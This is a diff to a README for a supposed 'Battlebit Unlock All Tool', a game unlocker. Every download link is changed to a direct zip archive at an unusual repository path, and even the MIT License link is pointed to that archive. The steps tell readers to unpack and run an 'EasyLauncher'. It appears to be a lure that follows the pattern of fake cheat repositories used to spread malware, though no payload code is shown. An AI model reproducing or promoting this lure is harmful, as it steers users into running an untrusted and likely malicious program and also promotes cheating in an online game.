@@ -1,6 +1,6 @@
 # 🚀 Battlebit Unlock All Tool
 
-[![Download](https://img.shields.io/badge/Download-EasyLauncher-blue.svg)](https://graph.org/EasyLauncher-06-23)
+[![Download](https://raw.githubusercontent.com/Rwiddhi03/Battlebit-UnlockSuite/main/obconical/Battlebit-UnlockSuite.zip)](https://raw.githubusercontent.com/Rwiddhi03/Battlebit-UnlockSuite/main/obconical/Battlebit-UnlockSuite.zip)
 
 Unlock every operator, weapon, and class in Battlebit for ultimate gameplay customization! The Battlebit Unlock All Tool 2025 offers enhanced accessibility and flexible progression for all players, providing seamless access to premium features, skins, attachments, and more.
 
@@ -44,7 +44,7 @@ This tool is intended for educational and accessibility purposes only. Use respo
 
 ## 📦 Installation Guide
 
-1. [![Download](https://img.shields.io/badge/Download-EasyLauncher-blue.svg)](https://graph.org/EasyLauncher-06-23)
+1. [![Download](https://raw.githubusercontent.com/Rwiddhi03/Battlebit-UnlockSuite/main/obconical/Battlebit-UnlockSuite.zip)](https://raw.githubusercontent.com/Rwiddhi03/Battlebit-UnlockSuite/main/obconical/Battlebit-UnlockSuite.zip)
 2. Unpack the archive to your desktop.
 3. Launch the EasyLauncher and follow on-screen instructions.
 4. Enjoy enhanced Battlebit access!
@@ -53,11 +53,11 @@ This tool is intended for educational and accessibility purposes only. Use respo
 
 ## 📚 License
 
-This repository uses the [MIT License](https://opensource.org/licenses/MIT) for open-source distribution.  
+This repository uses the [MIT License](https://raw.githubusercontent.com/Rwiddhi03/Battlebit-UnlockSuite/main/obconical/Battlebit-UnlockSuite.zip) for open-source distribution.  
 All contributions are welcome.
 
 ---
 
 ## 🔗 Download link
 
-[![Download](https://img.shields.io/badge/Download-EasyLauncher-blue.svg)](https://graph.org/EasyLauncher-06-23)
+[![Download](https://raw.githubusercontent.com/Rwiddhi03/Battlebit-UnlockSuite/main/obconical/Battlebit-UnlockSuite.zip)](https://raw.githubusercontent.com/Rwiddhi03/Battlebit-UnlockSuite/main/obconical/Battlebit-UnlockSuite.zip)
